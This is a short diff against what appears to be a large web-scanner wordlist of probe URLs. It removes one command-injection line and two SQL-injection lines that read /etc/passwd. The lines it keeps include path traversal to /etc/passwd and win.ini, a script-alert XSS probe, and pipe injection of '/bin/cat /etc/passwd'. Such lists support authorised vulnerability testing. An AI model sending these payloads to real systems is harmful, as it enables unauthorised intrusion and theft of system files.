@@ -5404,7 +5404,6 @@ cgi-bin/search.cgi?..\\..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini
 cgi-bin/shopper.cgi?newpage=../../../../../../../../../../etc/passwd
 cgi-bin/test-cgi
 cgi-bin/testcgi.exe
-cgi-bin/tst.bat|dir%20..\\..\\..\\..\\..\\..\\..\\..\\,
 cgi-bin/ustorekeeper.pl?command=goto&file=../../../../../../../../../../etc/passwd
 cgi-bin/webdriver
 cgi-bin/wrap
@@ -43956,8 +43955,6 @@ SiteServer/Knowledge/Default.asp?ctr=\"><script>alert('Vulnerable')</script>
 SiteServer/Publishing/ViewCode.asp
 siteserver/publishing/viewcode.asp?source=/default.asp
 Sites/Knowledge/Membership/Inspiredtutorial/ViewCode.asp
-site/' UNION ALL SELECT FileToClob('/etc/passwd','server')::html,0 FROM sysusers WHERE username = USER --/.html
-site/' UNION ALL SELECT FileToClob('/etc/passwd','server')::html,0 FROM sysusers WHERE username=USER --/.html
 /siteUserMod.cgi
 smartsearch.cgi?keywords=|/bin/cat%20/etc/passwd|
 smartsearch/smartsearch.cgi?keywords=|/bin/cat%20/etc/passwd|
